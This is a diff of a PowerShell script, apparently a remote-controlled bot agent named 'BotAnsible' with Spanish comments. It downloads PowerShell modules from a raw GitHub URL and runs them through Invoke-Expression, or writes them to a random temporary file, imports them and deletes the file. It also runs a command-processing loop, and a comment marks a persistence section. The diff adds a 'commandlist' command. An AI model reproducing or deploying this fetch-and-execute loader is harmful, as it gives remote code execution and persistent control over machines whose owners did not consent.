@@ -7,16 +7,16 @@ function loader{    # aqui empieza la funcion loader
     )
     $ruta=$path;$ruta+=$file;$ruta+=".psm1" # monta la ruta completa
     $ruta
-    $file=Get-RandomPath
+    $file=Get-RandomPath;$file+=".psm1"
     (Invoke-WebRequest $ruta -UseBasicParsing).Content > $file
-    ipmo $file; rm -f $file
+    ipmo $file; rm $file
 }
 
 $condition = $true
 $path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Dirección local donde cargar funciones y devolver resultados en caso de necesidad
 $ruta = $path;$ruta+="account_ansible";$ruta+=".psm1"
 (Invoke-WebRequest $ruta -UseBasicParsing).Content | iex
-#$commandlist=@('account_ansible')
+$commandlist=@('account_ansible')
 $GLOBAL:joblist=@{}
 #if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
 #persistence
@@ -77,6 +77,9 @@ while($condition){
             if($command[0] -eq "help"){
                 loader -path $path -file helper
                 helper
+            }
+            if($command[0] -eq "commandlist"){
+                $global:execute = $commandlist
             }
             $global:execute
             #$global:execute.Length
